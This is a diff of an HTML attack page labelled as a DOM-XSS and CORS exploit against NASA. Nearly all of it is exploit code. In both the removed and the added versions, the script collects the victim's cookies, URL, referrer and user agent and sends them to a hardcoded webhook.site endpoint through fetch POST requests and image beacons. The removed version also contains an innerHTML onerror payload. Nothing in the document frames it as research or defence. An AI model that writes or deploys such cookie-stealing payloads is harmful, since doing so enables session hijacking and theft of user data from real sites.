@@ -1,42 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>NASA DOM-XSS Exploit</title>
+  <title>NASA DOM-XSS CORS Exploit</title>
 </head>
 <body>
-  <h2>Executing DOM-XSS Exploit...</h2>
+  <h3>Exploiting...</h3>
+
   <script>
-    // 🚀 استغلال location.hash → frameworkService.js
-    let hashPayload = location.hash.replace('#', '');
+    try {
+      let payload = btoa("COOKIES=" + document.cookie + "&URL=" + location.href);
+      let img = new Image();
+      img.src = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de/img?" + payload;
+      document.body.appendChild(img);
 
-    // ✅ جمع بيانات الجلسة
-    const data = {
-      cookies: document.cookie,
-      url: location.href,
-      domain: document.domain,
-      userAgent: navigator.userAgent,
-      referrer: document.referrer,
-      timestamp: new Date().toISOString()
-    };
-
-    // 📡 إرسال البيانات إلى Webhook
-    fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ type: "XSS-Exfiltration", payload: hashPayload, info: data })
-    });
-
-    // 💉 تنفيذ عبر innerHTML
-    const div = document.createElement('div');
-    div.innerHTML = `<img src=x onerror=fetch('https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?c='+document.cookie)>`;
-    document.body.appendChild(div);
-
-    // ⏱ استغلال setTimeout من frameworkService.js
-    setTimeout(() => {
-      const i = document.createElement('img');
-      i.src = 'https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?t=' + btoa(document.cookie);
-      document.body.appendChild(i);
-    }, 1500);
+      fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          url: location.href,
+          cookies: document.cookie,
+          referrer: document.referrer,
+          userAgent: navigator.userAgent
+        })
+      });
+    } catch (e) {
+      console.error("Exploit failed:", e);
+    }
   </script>
 </body>
 </html>
